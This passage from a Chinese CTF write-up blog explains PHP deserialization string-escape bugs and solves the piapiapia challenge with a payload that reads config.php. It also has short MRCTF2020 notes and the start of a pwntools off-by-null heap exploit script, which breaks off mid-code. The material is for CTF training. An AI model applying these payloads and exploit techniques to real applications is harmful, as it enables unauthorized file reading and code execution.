class="variable">$t1</span>-&gt;password);</span><br></pre></td></tr></table></figure><p>因为<code>&#39;admin&quot;;s:8:&quot;password&quot;;s:6:&quot;hacker&quot;;&#125;&#39;</code>长度为36，所以我们故意把filter把admin替换成长为36的字符串，这样就后面的<code>&quot;;s:8:&quot;password&quot;;s:6:&quot;hacker&quot;;&#125;&#39;</code>就可以逃逸出去，顶替成为类的成员变量。</p><p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gvsghr6fzrj31fk048dhb.jpg" alt=""></p><h4 id="反序列化字符串变短逃逸"><a href="#反序列化字符串变短逃逸" class="headerlink" title="反序列化字符串变短逃逸"></a>反序列化字符串变短逃逸</h4><p>先说核心思想，上文中提到的是字符串过长然后将恶意数据“顶出去”，从而将其他的类成员变量篡改；变短逃逸的核心原理是将字符串缩短，将php自己记录的数据当做字符串“缩回来”，从而使后面的恶意数据得以逃逸出去。</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">filter</span>(<span class="params"><span class="variable">$string</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> str_replace(<span class="string">&#x27;abcdefghijklm&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="variable">$string</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>先看如下filter，会将13个字符的字符串替换为空，为啥长度是13呢，是因为我们要将系统数据包含进去的长度<code>&quot;;s:8:&quot;password&quot;;s:34:&quot;abc&quot;</code>为26，正好是13的倍数，方便构造数据逃逸，我们且看下文。</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">filter</span>(<span class="params"><span class="variable">$string</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> str_replace(<span class="string">&#x27;abcdefghijklm&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="variable">$string</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$username</span> = <span class="string">&#x27;abcdefghijklmabcdefghijklm&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$password</span> = <span class="string">&#x27;abc&quot;;s:8:&quot;password&quot;;s:6:&quot;hacker&quot;;&#125;&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$t</span> = <span class="keyword">new</span> Test();</span><br><span class="line"></span><br><span class="line"><span class="variable">$tmp</span> = serialize(<span class="variable">$t</span>);</span><br><span class="line">printf(<span class="string">&quot;%s\n&quot;</span>, <span class="variable">$tmp</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$t1</span> = unserialize(<span class="variable">$tmp</span>);</span><br><span class="line">printf(<span class="string">&quot;username-&gt;%s\n&quot;</span>, <span class="variable">$t1</span>-&gt;username);</span><br><span class="line">printf(<span class="string">&quot;password-&gt;%s\n&quot;</span>, <span class="variable">$t1</span>-&gt;password);</span><br></pre></td></tr></table></figure><p>首先还是没有加filter的情况，很正常。</p><p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gvsh5xzygyj31c603iwf1.jpg" alt=""></p><p>加上filter我们观察一下：</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">filter</span>(<span class="params"><span class="variable">$string</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> str_replace(<span class="string">&#x27;abcdefghijklm&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="variable">$string</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$username</span> = <span class="string">&#x27;abcdefghijklmabcdefghijklm&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$password</span> = <span class="string">&#x27;abc&quot;;s:8:&quot;password&quot;;s:6:&quot;hacker&quot;;&#125;&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$t</span> = <span class="keyword">new</span> Test();</span><br><span class="line"></span><br><span class="line"><span class="variable">$tmp</span> = serialize(<span class="variable">$t</span>);</span><br><span class="line">printf(<span class="string">&quot;%s\n&quot;</span>, <span class="variable">$tmp</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$t1</span> = unserialize(<span class="variable">$tmp</span>);</span><br><span class="line">printf(<span class="string">&quot;username-&gt;%s\n&quot;</span>, <span class="variable">$t1</span>-&gt;username);</span><br><span class="line">printf(<span class="string">&quot;password-&gt;%s\n&quot;</span>, <span class="variable">$t1</span>-&gt;password);</span><br></pre></td></tr></table></figure><p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gvsh8iacdmj31io09kdij.jpg" alt=""></p><h3 id="题解"><a href="#题解" class="headerlink" title="题解"></a>题解</h3><p>朴实无华的bootstrap风格的登录页面</p><p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gvshe9fgsxj31hi0u040j.jpg" alt=""></p><p>sql盲测俩数据，发现不行，直接url栏里输入www.zip，wdnmd，真有源码，都不用扫的，👴🏻喜欢。</p><p>有如下文件，poc.php和info.php是我加的用来做测试用的。</p><p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gvshfkfml7j30hc0o83zt.jpg" alt=""></p><p>发现config.php里面有flag</p><p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gvshj58c7dj30hy08sdgf.jpg" alt=""></p><p>然后发现index.php是登录，并没有sql注入的地方，过滤的很好。</p><p>然后有注册功能，我们先按正常业务走走。</p><p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gvshgtzwwoj30w40oimy8.jpg" alt=""></p><p>注册个账号</p><p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gvshhboehjj30kg0l8q3s.jpg" alt=""></p><p>然后登录</p><p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gvshhvwfo0j30r20vajst.jpg" alt="">登录成功后发现可以进行profile文件的更改，那漏洞大概在这没跑了，我们进到源码里面审计一下。</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">require_once</span>(<span class="string">&#x27;class.php&#x27;</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$_SESSION</span>[<span class="string">&#x27;username&#x27;</span>] == <span class="literal">null</span>) &#123;</span><br><span class="line"><span class="keyword">die</span>(<span class="string">&#x27;Login First&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;phone&#x27;</span>] &amp;&amp; <span class="variable">$_POST</span>[<span class="string">&#x27;email&#x27;</span>] &amp;&amp; <span class="variable">$_POST</span>[<span class="string">&#x27;nickname&#x27;</span>] &amp;&amp; <span class="variable">$_FILES</span>[<span class="string">&#x27;photo&#x27;</span>]) &#123;</span><br><span class="line"></span><br><span class="line"><span class="variable">$username</span> = <span class="variable">$_SESSION</span>[<span class="string">&#x27;username&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(!preg_match(<span class="string">&#x27;/^\d&#123;11&#125;$/&#x27;</span>, <span class="variable">$_POST</span>[<span class="string">&#x27;phone&#x27;</span>]))</span><br><span class="line"><span class="keyword">die</span>(<span class="string">&#x27;Invalid phone&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!preg_match(<span class="string">&#x27;/^[_a-zA-Z0-9]&#123;1,10&#125;@[_a-zA-Z0-9]&#123;1,10&#125;\.[_a-zA-Z0-9]&#123;1,10&#125;$/&#x27;</span>, <span class="variable">$_POST</span>[<span class="string">&#x27;email&#x27;</span>]))</span><br><span class="line"><span class="keyword">die</span>(<span class="string">&#x27;Invalid email&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(preg_match(<span class="string">&#x27;/[^a-zA-Z0-9_]/&#x27;</span>, <span class="variable">$_POST</span>[<span class="string">&#x27;nickname&#x27;</span>]) || strlen(<span class="variable">$_POST</span>[<span class="string">&#x27;nickname&#x27;</span>]) &gt; <span class="number">10</span>)</span><br><span class="line"><span class="keyword">die</span>(<span class="string">&#x27;Invalid nickname&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$file</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;photo&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$file</span>[<span class="string">&#x27;size&#x27;</span>] &lt; <span class="number">5</span> <span class="keyword">or</span> <span class="variable">$file</span>[<span class="string">&#x27;size&#x27;</span>] &gt; <span class="number">1000000</span>)</span><br><span class="line"><span class="keyword">die</span>(<span class="string">&#x27;Photo size error&#x27;</span>);</span><br><span class="line"></span><br><span class="line">move_uploaded_file(<span class="variable">$file</span>[<span class="string">&#x27;tmp_name&#x27;</span>], <span class="string">&#x27;upload/&#x27;</span> . md5(<span class="variable">$file</span>[<span class="string">&#x27;name&#x27;</span>]));</span><br><span class="line"><span class="variable">$profile</span>[<span class="string">&#x27;phone&#x27;</span>] = <span class="variable">$_POST</span>[<span class="string">&#x27;phone&#x27;</span>];</span><br><span class="line"><span class="variable">$profile</span>[<span class="string">&#x27;email&#x27;</span>] = <span class="variable">$_POST</span>[<span class="string">&#x27;email&#x27;</span>];</span><br><span class="line"><span class="variable">$profile</span>[<span class="string">&#x27;nickname&#x27;</span>] = <span class="variable">$_POST</span>[<span class="string">&#x27;nickname&#x27;</span>];</span><br><span class="line"><span class="variable">$profile</span>[<span class="string">&#x27;photo&#x27;</span>] = <span class="string">&#x27;upload/&#x27;</span> . md5(<span class="variable">$file</span>[<span class="string">&#x27;name&#x27;</span>]);</span><br><span class="line"></span><br><span class="line"><span class="variable">$user</span>-&gt;update_profile(<span class="variable">$username</span>, serialize(<span class="variable">$profile</span>));</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;Update Profile Success!&lt;a href=&quot;profile.php&quot;&gt;Your Profile&lt;/a&gt;&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">   &lt;title&gt;UPDATE&lt;/title&gt;</span><br><span class="line">   &lt;link href=<span class="string">&quot;static/bootstrap.min.css&quot;</span> rel=<span class="string">&quot;stylesheet&quot;</span>&gt;</span><br><span class="line">   &lt;script src=<span class="string">&quot;static/jquery.min.js&quot;</span>&gt;&lt;/script&gt;</span><br><span class="line">   &lt;script src=<span class="string">&quot;static/bootstrap.min.js&quot;</span>&gt;&lt;/script&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;div class=&quot;container&quot; style=&quot;margin-top:100px&quot;&gt;  </span><br><span class="line">&lt;form action=&quot;update.php&quot; method=&quot;post&quot; enctype=&quot;multipart/form-data&quot; class=&quot;well&quot; style=&quot;width:220px;margin:0px auto;&quot;&gt; </span><br><span class="line">&lt;img src=&quot;static/piapiapia.gif&quot; class=&quot;img-memeda &quot; style=&quot;width:180px;margin:0px auto;&quot;&gt;</span><br><span class="line">&lt;h3&gt;Please Update Your Profile&lt;/h3&gt;</span><br><span class="line">&lt;label&gt;Phone:&lt;/label&gt;</span><br><span class="line">&lt;input type=&quot;text&quot; name=&quot;phone&quot; style=&quot;height:30px&quot;class=&quot;span3&quot;/&gt;</span><br><span class="line">&lt;label&gt;Email:&lt;/label&gt;</span><br><span class="line">&lt;input type=&quot;text&quot; name=&quot;email&quot; style=&quot;height:30px&quot;class=&quot;span3&quot;/&gt;</span><br><span class="line">&lt;label&gt;Nickname:&lt;/label&gt;</span><br><span class="line">&lt;input type=&quot;text&quot; name=&quot;nickname&quot; style=&quot;height:30px&quot; class=&quot;span3&quot;&gt;</span><br><span class="line">&lt;label <span class="keyword">for</span>=<span class="string">&quot;file&quot;</span>&gt;Photo:&lt;/label&gt;</span><br><span class="line">&lt;input type=&quot;file&quot; name=&quot;photo&quot; style=&quot;height:30px&quot;class=&quot;span3&quot;/&gt;</span><br><span class="line">&lt;button type=&quot;submit&quot; class=&quot;btn btn-primary&quot;&gt;UPDATE&lt;/button&gt;</span><br><span class="line">&lt;/form&gt;</span><br><span class="line">&lt;/div&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gvshkdrp46j31540fk0vd.jpg" alt=""></p><p>文件上传的地方看似没有校验文件类型，但是我们传php文件上去会被md5，后缀会被🐑了，所以没法利用。</p><p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gvshlh1tu8j30x4066753.jpg" alt=""></p><p>信息输入完成后会调用update_profile函数，序列化profile数组，我们进去看看</p><p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gvshmsbnpwj30yc0aegmr.jpg" alt=""></p><p>会做filter处理，serialize + filter，DNA动了</p><p>处理完会update到数据库里面，然后转到profile.php显示信息：</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">require_once</span>(<span class="string">&#x27;class.php&#x27;</span>);</span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$_SESSION</span>[<span class="string">&#x27;username&#x27;</span>] == <span class="literal">null</span>) &#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;Login First&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$username</span> = <span class="variable">$_SESSION</span>[<span class="string">&#x27;username&#x27;</span>];</span><br><span class="line"><span class="variable">$profile</span> = <span class="variable">$user</span>-&gt;show_profile(<span class="variable">$username</span>);</span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$profile</span> == <span class="literal">null</span>) &#123;</span><br><span class="line">    header(<span class="string">&#x27;Location: update.php&#x27;</span>);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="variable">$profile</span> = unserialize(<span class="variable">$profile</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;unserialize:&quot;</span> . <span class="variable">$profile</span> . <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">    <span class="variable">$phone</span> = <span class="variable">$profile</span>[<span class="string">&#x27;phone&#x27;</span>];</span><br><span class="line">    <span class="variable">$email</span> = <span class="variable">$profile</span>[<span class="string">&#x27;email&#x27;</span>];</span><br><span class="line">    <span class="variable">$nickname</span> = <span class="variable">$profile</span>[<span class="string">&#x27;nickname&#x27;</span>];</span><br><span class="line">    <span class="variable">$photo</span> = base64_encode(file_get_contents(<span class="variable">$profile</span>[<span class="string">&#x27;photo&#x27;</span>]));</span><br><span class="line">    <span class="meta">?&gt;</span></span><br><span class="line">    &lt;!DOCTYPE html&gt;</span><br><span class="line">    &lt;html&gt;</span><br><span class="line">    &lt;head&gt;</span><br><span class="line">        &lt;title&gt;Profile&lt;/title&gt;</span><br><span class="line">        &lt;link href=<span class="string">&quot;static/bootstrap.min.css&quot;</span> rel=<span class="string">&quot;stylesheet&quot;</span>&gt;</span><br><span class="line">        &lt;script src=<span class="string">&quot;static/jquery.min.js&quot;</span>&gt;&lt;/script&gt;</span><br><span class="line">        &lt;script src=<span class="string">&quot;static/bootstrap.min.js&quot;</span>&gt;&lt;/script&gt;</span><br><span class="line">    &lt;/head&gt;</span><br><span class="line">    &lt;body&gt;</span><br><span class="line">    &lt;div class=&quot;container&quot; style=&quot;margin-top:100px&quot;&gt;</span><br><span class="line">        &lt;img src=&quot;data:image/gif;base64,&lt;?php echo $photo; ?&gt;&quot; class=&quot;img-memeda &quot; style=&quot;width:180px;margin:0px auto;&quot;&gt;</span><br><span class="line">        &lt;h3&gt;Hi <span class="meta">&lt;?php</span> <span class="keyword">echo</span> <span class="variable">$nickname</span>; <span class="meta">?&gt;</span>&lt;/h3&gt;</span><br><span class="line">        &lt;label&gt;Phone: <span class="meta">&lt;?php</span> <span class="keyword">echo</span> <span class="variable">$phone</span>; <span class="meta">?&gt;</span>&lt;/label&gt;</span><br><span class="line">        &lt;label&gt;Email: <span class="meta">&lt;?php</span> <span class="keyword">echo</span> <span class="variable">$email</span>; <span class="meta">?&gt;</span>&lt;/label&gt;</span><br><span class="line">    &lt;/div&gt;</span><br><span class="line">    &lt;/body&gt;</span><br><span class="line">    &lt;/html&gt;</span><br><span class="line">    <span class="meta">&lt;?php</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>这个地方会首先反序列化，然后可以读文件。</p><p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gvshrknyugj30xu0bwq4j.jpg" alt=""></p><p>那么思路顿时清晰了起来，反序列化的变量我们是可控的，在update.php的那个地方我们能够填写表单来控制，然后我们如果把$profile[‘photo’]给改写成config.php那么这个题就做出来了。</p><p>回到我们可控的点update.php处，我们观察一些filter</p><p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gvshtzstvoj31b80byq4v.jpg" alt=""></p><p>因为要控制phpto这个字段，所以我们可以从nickname入手，通过传递数组即可绕过长度和正则判断。</p><p>我们先本地写一写poc来理一理思路</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$profile</span> = <span class="keyword">array</span>(<span class="string">&quot;phone&quot;</span> =&gt; <span class="variable">$_GET</span>[<span class="string">&#x27;phone&#x27;</span>], <span class="string">&quot;email&quot;</span> =&gt; <span class="variable">$_GET</span>[<span class="string">&#x27;email&#x27;</span>], <span class="string">&quot;nickname&quot;</span> =&gt; <span class="variable">$_GET</span>[<span class="string">&#x27;nickname&#x27;</span>], <span class="string">&quot;photo&quot;</span> =&gt; <span class="string">&quot;upload/&quot;</span> . md5(<span class="string">&quot;lemon.php&quot;</span>));</span><br><span class="line"></span><br><span class="line"><span class="variable">$t</span> = serialize(<span class="variable">$profile</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$t</span>;</span><br><span class="line"><span class="comment">// a:4:&#123;s:5:&quot;phone&quot;;s:11:&quot;12345678901&quot;;s:5:&quot;email&quot;;s:16:&quot;lemon@hacker.com&quot;;s:8:&quot;nickname&quot;;a:1:&#123;i:0;s:7:&quot;payload&quot;;&#125;s:5:&quot;photo&quot;;s:39:&quot;upload/31bddb5e1ea7e741dce2c091a0e8068d&quot;;&#125;</span></span><br></pre></td></tr></table></figure><p>我们看我们传入之后做的filter，在class.php中，又做了一层filter，本意是防止sql注入的一个utils方法，但是不应该用在序列化和反序列中，注意到，where是五个字符，会将其替换为hacker，变成六个字符，导致了反序列化字符串逃逸漏洞。</p><p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gvsi98ia09j30w60fm761.jpg" alt=""></p><p>那么我们的payload应该如下构造，是以下面这种形式</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">a:4:&#123;s:5:&quot;phone&quot;;s:11:&quot;12345678901&quot;;s:5:&quot;email&quot;;s:16:&quot;lemon@hacker.com&quot;;s:8:&quot;nickname&quot;;a:1:&#123;i:0;s:7:&quot;...&quot;;&#125;s:5:&quot;photo&quot;;s:10:&quot;config.php&quot;;&#125;</span><br></pre></td></tr></table></figure><p>那么我们就要考虑长度问题，可以用where到hacker使之增长一个字符，</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">len</span>(<span class="string">&#x27;&quot;;&#125;s:5:&quot;photo&quot;;s:10:&quot;config.php&quot;;&#125;&#x27;</span>)</span><br><span class="line"><span class="number">34</span></span><br></pre></td></tr></table></figure><p>这一段的长度为34，所以我们应该变长34个字符，用34个where即可变长34个字符，这样后34个字符可以逃逸出去，我们抓包来打这个。</p><p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gvsiizdrn5j31h60u07hr.jpg" alt=""></p><p>访问profile.php，拿到base64encode数据</p><p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gvsilxej6wj31h60u07bq.jpg" alt=""></p><p>成功读取flag</p><p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gvsimjz0boj327y08y76p.jpg" alt=""></p><h2 id="MRCTF2020-PYWebsite"><a href="#MRCTF2020-PYWebsite" class="headerlink" title="[MRCTF2020]PYWebsite"></a>[MRCTF2020]PYWebsite</h2><p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gvsru5ix92j31140u00vw.jpg" alt=""></p><p>看了wp，发现是提示“我自己”，于是该X-Forwarded-For，什么脑洞题😅</p><p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gvsrtp8oirj31h60u0q8k.jpg" alt=""></p><h2 id="MRCTF2020-套娃"><a href="#MRCTF2020-套娃" class="headerlink" title="[MRCTF2020]套娃"></a>[MRCTF2020]套娃</h2><ul><li>传参中的空格和小数点会自动替换为下划线</li><li>%0a可以绕过开头结尾的正则</li><li>Client-ip和X-Forwarded-For用来记录ip</li><li>file_get_contents利用伪协议可以绕过</li></ul>]]></content>
      
      
      
        <tags>
            
            <tag> web </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>UJNCTF校赛wp</title>
      <link href="2021/10/11/UJNCTF%E6%A0%A1%E8%B5%9Bwp/"/>
      <url>2021/10/11/UJNCTF%E6%A0%A1%E8%B5%9Bwp/</url>
      
        <content type="html"><![CDATA[<h1 id="wp-by-lemon"><a href="#wp-by-lemon" class="headerlink" title="wp by lemon"></a>wp by lemon</h1><h2 id="pwn"><a href="#pwn" class="headerlink" title="pwn"></a>pwn</h2><h3 id="null"><a href="#null" class="headerlink" title="null"></a>null</h3><p>签到题，因为是出题人所以还是写下wp QAQ</p><p><img src="https://tva1.sinaimg.cn/large/008i3skNly1guzom7s7kkj61h80lagp802.jpg" alt=""></p><p>edit函数中调用了sub_994，点进去观察函数</p><p><img src="https://tva1.sinaimg.cn/large/008i3skNly1guzon020cfj616u0h8diw02.jpg" alt=""></p><p>这个函数本质上是想如果输入回车后填充00字节来代替回车的’\x0a’，但是忽略了填充完全的情况，导致off-by-null漏洞，可以溢出一个空字节</p><p>思路：申请一系列堆块，重点有俩堆块，一个堆块是被溢出的堆块记为victim，其size要满足0x?f0的条件，因为在header中填充后其size的低字节为01，offbynull溢出后其低字节为00，可以向前malloc_consolidate；一个堆块是victim的prev_size索引到的堆块，这个堆块要满足unsorted bin大小，因为在向前合并的过程中会unlink，会检查fd和bk的合法性，利用unsorted bin的特性让系统帮我们”伪造“fd和bk指针。</p><p>然后有了overlap岂不是随便玩就好了</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line">arch =  <span class="number">64</span></span><br><span class="line">challenge = <span class="string">&quot;./null&quot;</span></span><br><span class="line">libc_path_local = <span class="string">&quot;/glibc/x64/2.27/lib/libc.so.6&quot;</span></span><br><span class="line">libc_path_remote = <span class="string">&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">local = <span class="built_in">int</span>(sys.argv[<span class="number">1</span>])</span><br><span class="line">elf = ELF(challenge)</span><br><span class="line"></span><br><span class="line">context.os = <span class="string">&#x27;linux&#x27;</span></span><br><span class="line">context.terminal = [<span class="string">&#x27;tmux&#x27;</span>, <span class="string">&#x27;splitw&#x27;</span>, <span class="string">&#x27;-h&#x27;</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> local:</span><br><span class="line">    <span class="keyword">if</span> libc_path_local:</span><br><span class="line">        io = process(challenge,env = &#123;<span class="string">&quot;LD_PRELOAD&quot;</span>:libc_path_local&#125;)</span><br><span class="line">        libc = ELF(libc_path_local)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        io = process(challenge)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    io = remote(<span class="string">&quot;node4.buuoj.cn&quot;</span>, <span class="number">25965</span>)</span><br><span class="line">    <span class="keyword">if</span> libc_path_remote:</span><br><span class="line">        libc = ELF(libc_path_remote)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> arch == <span class="number">64</span>:</span><br><span class="line">    context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"><span class="keyword">elif</span> arch == <span class="number">32</span>:</span><br><span class="line">    context.arch = <span class="string">&#x27;i386&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dbg</span>():</span></span><br><span class="line">    context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">echo</span>(<span class="params">content</span>):</span></span><br><span class="line">    print(<span class="string">&quot;\033[4;36;40mOutput prompts:\033[0m&quot;</span> + <span class="string">&quot;\t\033[7;33;40m[*]\033[0m &quot;</span> + <span class="string">&quot;\033[1;31;40m&quot;</span> + content + <span class="string">&quot;\033[0m&quot;</span>)</span><br><span class="line"></span><br><span class="line">p   = <span class="keyword">lambda</span>      : pause() </span><br><span class="line">s   = <span class="keyword">lambda</span> x    : success(x)</span><br><span class="line">re  = <span class="keyword">lambda</span> m, t : io.recv(numb=m, timeout=t)</span><br><span class="line">ru  = <span class="keyword">lambda</span> x    : io.recvuntil(x)</span><br><span class="line">rl  = <span class="keyword">lambda</span>      : io.recvline()</span><br><span class="line">sd  = <span class="keyword">lambda</span> x    : io.send(x)</span><br><span class="line">sl  = <span class="keyword">lambda</span> x    : io.sendline(x)</span><br><span class="line">ia  = <span class="keyword">lambda</span>      : io.interactive()</span><br><span class="line">sla = <span class="keyword">lambda</span> a, b : io.sendlineafter(a, b)</span><br><span class="line">sa  = <span class="keyword">lambda</span> a, b : io.sendafter(a, b)</span><br><span class="line">uu32 = <span class="keyword">lambda</span> x   : u32(x.ljust(<span class="number">4</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">uu64 = <span class="keyword">lambda</span> x   : u64(x.ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line"></span><br><span class="line">bps = []</span><br><span class="line">pie = <span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">gdba</span>():</span></span><br><span class="line">    <span class="keyword">if</span> local == <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span></span><br><span class="line">    cmd =<span class="string">&#x27;set follow-fork-mode parent\n&#x27;</span></span><br><span class="line">    <span class="keyword">if</span> pie:</span><br><span class="line">        base = <span class="built_in">int</span>(os.popen(<span class="string">&quot;pmap &#123;&#125;|awk &#x27;&#123;&#123;print ./null&#125;&#125;&#x27;&quot;</span>.<span class="built_in">format</span>(io.pid)).readlines()[<span class="number">1</span>],<span class="number">16</span>)</span><br><span class="line">        cmd +=<span class="string">&#x27;&#x27;</span>.join([<span class="string">&#x27;b *&#123;:#x&#125;\n&#x27;</span>.<span class="built_in">format</span>(b+base) <span class="keyword">for</span> b <span class="keyword">in</span> bps])</span><br><span class="line">        cmd +=<span class="string">&#x27;set base=&#123;:#x&#125;\n&#x27;</span>.<span class="built_in">format</span>(base)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        cmd+=<span class="string">&#x27;&#x27;</span>.join([<span class="string">&#x27;b *&#123;:#x&#125;\n&#x27;</span>.<span class="built_in">format</span>(b) <span class="keyword">for</span> b <span class="keyword">in</span> bps])</span><br><span class="line">    gdb.attach(io,cmd)</span><br><span class="line"></span><br><span class="line">_add,_free,_edit,_show = <span class="number">1</span>,<span class="number">4</span>,<span class="number">2</span>,<span class="number">3</span></span><br><span class="line"></span><br><span class="line">menu = <span class="string">&quot;choide:&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span>(<span class="params">size, content</span>):</span></span><br><span class="line">    sla(menu, <span class="built_in">str</span>(_add))</span><br><span class="line">    sla(<span class="string">&quot;size:&quot;</span>, <span class="built_in">str</span>(size))</span><br><span class="line">    sa(<span class="string">&quot;content:&quot;</span>, content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span>(<span class="params">idx, content</span>):</span></span><br><span class="line">    sla(menu, <span class="built_in">str</span>(_edit))</span><br><span class="line">    sla(<span class="string">&quot;index:&quot;</span>, <span class="built_in">str</span>(idx))</span><br><span class="line">    sa(<span class="string">&quot;content:&quot;</span>, content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free</span>(<span class="params">idx</span>):</span></span><br><span class="line">    sla(menu, <span class="built_in">str</span>(_free))</span><br><span class="line">    sla(<span class="string">&quot;index:&quot;</span>, <span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span>(<span class="params">idx</span>):</span></span><br><span class="line">    sla(menu, <span class="built_in">str</span>(_show))</span><br><span class="line">    